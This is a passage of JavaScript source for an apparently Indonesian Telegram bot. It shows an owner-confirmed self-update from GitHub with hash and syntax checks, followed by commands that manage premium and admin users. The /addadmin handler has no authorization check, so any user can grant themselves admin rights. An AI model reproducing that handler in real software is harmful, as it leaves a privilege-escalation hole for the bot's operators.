    throw new Error("File GitHub kosong.");
  }

  if (data.length > MAX_FILE_SIZE) {
    throw new Error("Ukuran file melebihi batas 2 MB.");
  }

  const beginning = data
    .subarray(0, 256)
    .toString("utf8")
    .trimStart();

  if (/^(?:<!doctype html|<html\b)/i.test(beginning)) {
    throw new Error("GitHub mengembalikan halaman HTML, bukan file JS.");
  }

  if (data.includes(0)) {
    throw new Error("File mengandung byte NUL yang tidak valid.");
  }

  return data;
}

// Validasi syntax sebelum file dipasang
function validateJavaScript(data, token) {
  const tempPath = path.join(
    __dirname,
    `.update-check-${process.pid}-${token}.js`
  );

  try {
    fs.writeFileSync(tempPath, data, { flag: "wx" });

    const result = spawnSync(
      process.execPath,
      ["--check", tempPath],
      {
        cwd: __dirname,
        encoding: "utf8",
        timeout: 15000
      }
    );

    if (result.error) {
      throw result.error;
    }

    if (result.status !== 0) {
      const details =
        result.stderr ||
        result.stdout ||
        "Syntax validation gagal.";

      throw new Error(details.slice(0, 1200));
    }
  } finally {
    try {
      if (fs.existsSync(tempPath)) {
        fs.unlinkSync(tempPath);
      }
    } catch {}
  }
}

// ============== COMMAND /update ==============
bot.onText(/^\/update(?:@\w+)?(?:\s|$)/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);

  // Hanya owner
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ Perintah ini hanya untuk owner bot."
    );
  }

  // Bersihkan konfirmasi yang kedaluwarsa
  for (const [token, pending] of pendingUpdates) {
    if (Date.now() > pending.expiresAt) {
      pendingUpdates.delete(token);
    }
  }

  if (checkingUpdate || updateInProgress) {
    return bot.sendMessage(
      chatId,
      "⏳ Proses update sedang berjalan."
    );
  }

  if (pendingUpdates.size > 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ Masih ada konfirmasi update yang menunggu. Pilih Update atau Batal dahulu."
    );
  }

  checkingUpdate = true;

  try {
    await bot.sendMessage(
      chatId,
      "🔎 Mengecek pembaruan dari GitHub..."
    );

    if (!fs.existsSync(BOT_FILE)) {
      throw new Error("File lokal index.js tidak ditemukan.");
    }

    // Hash file lokal dan GitHub
    const localData = fs.readFileSync(BOT_FILE);
    const remoteData = await downloadUpdate();

    const localHash = getSHA256(localData);
    const remoteHash = getSHA256(remoteData);

    // Tidak ada perubahan
    if (localHash === remoteHash) {
      return bot.sendMessage(
        chatId,
        "✅ Bot sudah menggunakan file yang sama dengan GitHub.\n\n" +
        `SHA-256: ${localHash}`
      );
    }

    // Periksa syntax sebelum menawarkan pemasangan
    const token = crypto.randomBytes(8).toString("hex");
    validateJavaScript(remoteData, token);

    pendingUpdates.set(token, {
      userId,
      chatId,
      data: remoteData,
      localHash,
      remoteHash,
      expiresAt: Date.now() + CONFIRM_EXPIRES_MS
    });

    await bot.sendMessage(
      chatId,
      "🆕 PEMBARUAN TERSEDIA!\n\n" +
      `📦 Repo: ${Owner}/${Repo}\n` +
      `📁 File: ${BranchPath}\n\n` +
      `🔹 SHA lokal: ${localHash.slice(0, 16)}...\n` +
      `🔹 SHA GitHub: ${remoteHash.slice(0, 16)}...\n\n` +
      "Syntax JavaScript lolos validasi.\n" +
      "Mau mengganti index.js sekarang?",
      {
        reply_markup: {
          inline_keyboard: [[
            {
              text: "✅ Update sekarang",
              callback_data: `upd_yes:${token}`
            },
            {
              text: "❌ Batal",
              callback_data: `upd_no:${token}`
            }
          ]]
        }
      }
    );
  } catch (error) {
    console.error("[UPDATE CHECK ERROR]", error);

    await bot.sendMessage(
      chatId,
      "❌ Gagal mengecek update.\n\n" +
      String(error.message).slice(0, 1200)
    ).catch(() => {});
  } finally {
    checkingUpdate = false;
  }
});

// ============== TOMBOL UPDATE / BATAL ==============
bot.on("callback_query", async (query) => {
  const data = query.data || "";
  const isConfirm = data.startsWith("upd_yes:");
  const isCancel = data.startsWith("upd_no:");

  // Abaikan callback milik fitur bot lain
  if (!isConfirm && !isCancel) return;

  const token = data.slice(data.indexOf(":") + 1);
  const pending = pendingUpdates.get(token);

  if (!pending) {
    return bot.answerCallbackQuery(query.id, {
      text: "Konfirmasi tidak ditemukan atau sudah kedaluwarsa.",
      show_alert: true
    }).catch(() => {});
  }

  // Pastikan hanya owner peminta yang bisa menekan tombol
  if (
    String(query.from.id) !== pending.userId ||
    !isOwner(query.from.id)
  ) {
    return bot.answerCallbackQuery(query.id, {
      text: "Tombol ini bukan milikmu.",
      show_alert: true
    }).catch(() => {});
  }

  if (Date.now() > pending.expiresAt) {
    pendingUpdates.delete(token);

    await bot.answerCallbackQuery(query.id, {
      text: "Konfirmasi sudah kedaluwarsa.",
      show_alert: true
    }).catch(() => {});

    return;
  }

  if (isCancel) {
    pendingUpdates.delete(token);

    await bot.answerCallbackQuery(query.id, {
      text: "Update dibatalkan."
    }).catch(() => {});

    return bot.editMessageText(
      "❎ Update dibatalkan.\nFile lokal tidak diubah.",
      {
        chat_id: pending.chatId,
        message_id: query.message.message_id
      }
    ).catch(() => {});
  }

  if (updateInProgress) {
    return bot.answerCallbackQuery(query.id, {
      text: "Update sedang berlangsung.",
      show_alert: true
    }).catch(() => {});
  }

  updateInProgress = true;
  pendingUpdates.delete(token);

  await bot.answerCallbackQuery(query.id, {
    text: "Memulai update..."
  }).catch(() => {});

  await bot.editMessageText(
    "⏳ Memvalidasi dan memasang pembaruan...",
    {
      chat_id: pending.chatId,
      message_id: query.message.message_id
    }
  ).catch(() => {});

  let replaced = false;
  let tempPath;

  try {
    // Pastikan file lama masih tersedia
    if (!fs.existsSync(BOT_FILE)) {
      throw new Error("File index.js lokal tidak ditemukan.");
    }

    // Validasi ulang data yang akan dipasang
    validateJavaScript(pending.data, token);

    // Backup versi lama dengan nama unik
    fs.mkdirSync(BACKUP_DIR, { recursive: true });

    const timestamp = new Date()
      .toISOString()
      .replace(/[:.]/g, "-");

    const backupPath = path.join(
      BACKUP_DIR,
      `index-${timestamp}-${token}.js`
    );

    fs.copyFileSync(
      BOT_FILE,
      backupPath,
      fs.constants.COPYFILE_EXCL
    );

    // Tulis file sementara pada folder yang sama
    tempPath = path.join(
      __dirname,
      `.index-update-${process.pid}-${token}.js`
    );

    const oldMode = fs.statSync(BOT_FILE).mode & 0o777;

    fs.writeFileSync(tempPath, pending.data, {
      flag: "wx",
      mode: oldMode
    });

    // Ganti file dengan rename atomik pada filesystem yang sama
    fs.renameSync(tempPath, BOT_FILE);
    tempPath = undefined;
    replaced = true;

    await bot.sendMessage(
      pending.chatId,
      "✅ UPDATE BERHASIL!\n\n" +
      `📦 Repo: ${Owner}/${Repo}\n` +
      "📄 File: index.js\n" +
      `💾 Backup: backups/${path.basename(backupPath)}\n\n` +
      "♻️ Proses akan keluar agar PM2 menjalankan ulang bot."
    ).catch((error) => {
      console.error("[UPDATE MESSAGE ERROR]", error.message);
    });

    // PM2 harus mengelola proses ini dengan autorestart aktif
    setTimeout(() => {
      process.exit(0);
    }, 1500);

  } catch (error) {
    console.error("[UPDATE APPLY ERROR]", error);

    await bot.sendMessage(
      pending.chatId,
      replaced
        ? "⚠️ File sudah diganti, tetapi ada masalah setelah penggantian. Periksa log dan status PM2."
        : "❌ Update gagal. File index.js lama tidak diganti.\n\n" +
          String(error.message).slice(0, 1200)
    ).catch(() => {});
  } finally {
    if (tempPath) {
      try {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      } catch {}
    }

    updateInProgress = false;
  }
});

// ============== COMMAND /cekrepo ==============
bot.onText(/^\/cekrepo(?:@\w+)?(?:\s|$)/i, async (msg) => {
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner.");
  }

  return bot.sendMessage(
    msg.chat.id,
    `🔗 Raw URL:\n${DEFAULT_RAW_URL}`
  );
});

console.log(
  `✅ Auto Update siap: ${Owner}/${Repo} -> ${BranchPath}`
);
//=====================================
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
}); 

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});